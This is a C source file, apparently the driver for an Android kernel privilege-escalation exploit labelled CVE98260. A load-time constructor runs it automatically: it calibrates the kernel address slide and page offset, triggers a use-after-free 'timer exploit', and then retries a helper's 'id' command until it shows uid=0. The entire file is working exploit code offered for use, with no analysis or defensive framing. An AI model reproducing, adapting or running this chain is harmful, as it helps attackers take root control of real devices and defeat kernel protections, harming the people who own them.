#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "profile.h"
#include "kernel_table.h"
#include "calib.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

static char app_home[PATH_MAX];

int uaf_plant_main(int argc, char **argv);

static void fail(const char *what)
{
    fprintf(stderr, "CVE98260_APP_FAIL %s errno=%d %s\n", what, errno,
            strerror(errno));
    _exit(1);
}

static void prepare_app_home(void)
{
    const char *configured = getenv("CVE98260_HOME");
    int written;

    if (!configured || !*configured)
        configured = "/data/local/tmp/cve98260-app";
    written = snprintf(app_home, sizeof(app_home), "%s", configured);
    if (written < 0 || (size_t)written >= sizeof(app_home)) {
        errno = ENAMETOOLONG;
        fail("app home path");
    }
    if (mkdir(app_home, 0700) && errno != EEXIST)
        fail("mkdir app home");
    if (setenv("CVE98260_HOME", app_home, 1))
        fail("setenv");
}

static void app_file(char *path, size_t size, const char *name)
{
    int written = snprintf(path, size, "%s/%s", app_home, name);

    if (written < 0 || (size_t)written >= size) {
        errno = ENAMETOOLONG;
        fail("app file path");
    }
}

static int read_hex_file(const char *path, uint64_t *value)
{
    FILE *file = fopen(path, "r");
    unsigned long long parsed = 0;

    if (!file)
        return -1;
    if (fscanf(file, "%llx", &parsed) != 1) {
        fclose(file);
        return -1;
    }
    fclose(file);
    *value = (uint64_t)parsed;
    return 0;
}

static int root_helper_id(const char *helper, char *proof, size_t proof_size)
{
    int pair[2];
    pid_t child;
    ssize_t total = 0;
    int status = 0;
    pid_t waited;

    if (pipe(pair))
        return 0;
    child = fork();
    if (child < 0) {
        close(pair[0]);
        close(pair[1]);
        return 0;
    }
    if (!child) {
        if (dup2(pair[1], STDOUT_FILENO) < 0 ||
            dup2(pair[1], STDERR_FILENO) < 0)
            _exit(126);
        close(pair[0]);
        close(pair[1]);
        execl(helper, helper, "-c", "id", (char *)NULL);
        _exit(127);
    }
    close(pair[1]);
    while ((size_t)total + 1 < proof_size) {
        ssize_t got = read(pair[0], proof + total, proof_size - 1 - total);

        if (got < 0 && errno == EINTR)
            continue;
        if (got <= 0)
            break;
        total += got;
    }
    proof[total] = 0;
    close(pair[0]);
    do {
        waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    return waited == child && WIFEXITED(status) && !WEXITSTATUS(status) &&
           strstr(proof, "uid=0") != NULL;
}

static int verify_root(const char *helper, char *proof, size_t proof_size)
{
    for (int attempt = 0; attempt < 200; ++attempt) {
        if (root_helper_id(helper, proof, proof_size))
            return 1;
        usleep(100000);
    }
    return 0;
}

__attribute__((constructor)) static void ddjb_timer_payload(void)
{
    static int started;
    const char *helper;
    char proof[512];
    uint64_t slide = 0;
    uint64_t page_offset = 0;
    char slide_arg[32];
    char page_arg[32];
    char slide_path[PATH_MAX];
    char page_path[PATH_MAX];
    char *calib_argv[] = {"calib", NULL};
    char *uaf_argv[] = {
        "uaf_plant",
        "--slide", slide_arg,
        "--page-offset", page_arg,
        "--daemon-exit",
        NULL,
    };

    if (started)
        return;
    started = 1;
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    helper = getenv("CVE43499_ROOT_HELPER");
    if (!helper || !*helper || access(helper, X_OK))
        fail("root helper missing");

    prepare_app_home();
    if (setenv("CVE98260_HELPER_DAEMON", "1", 1))
        fail("setenv");
    app_file(slide_path, sizeof(slide_path), "slide.txt");
    app_file(page_path, sizeof(page_path), "page_offset.txt");

    if (kernel_table_load_blob(PROFILE_BLOB, PROFILE_BLOB_SIZE) != 0)
        fail("profile load");

    printf("CVE98260_APP profile release=%s helper=%s\n",
           PROFILE_RELEASE, helper);
    fflush(stdout);

    if (calib_a_main(1, calib_argv) != 0)
        fail("slide calibration");
    if (read_hex_file(slide_path, &slide) != 0)
        fail("read slide");

    snprintf(slide_arg, sizeof(slide_arg), "0x%llx",
             (unsigned long long)slide);
    printf("CVE98260_APP slide=%s\n", slide_arg);
    fflush(stdout);

    /* calib-b falls back to the profile default when the lmap solve is weak. */
    calib_b_main(1, calib_argv);
    if (read_hex_file(page_path, &page_offset) != 0)
        fail("read page offset");
    snprintf(page_arg, sizeof(page_arg), "0x%llx",
             (unsigned long long)page_offset);
    printf("CVE98260_APP page_offset=%s\n", page_arg);
    fflush(stdout);

    if (uaf_plant_main(6, uaf_argv) != 0)
        fail("timer exploit");

    if (!verify_root(helper, proof, sizeof(proof))) {
        fprintf(stderr, "CVE98260_APP_FAIL root proof=%s\n", proof);
        _exit(1);
    }
    printf("CVE98260_APP_ROOT_PROOF %s", proof);
    if (!strchr(proof, '\n'))
        putchar('\n');
    printf("done=1 root=1\nexploit completed\n");
    fflush(stdout);
}
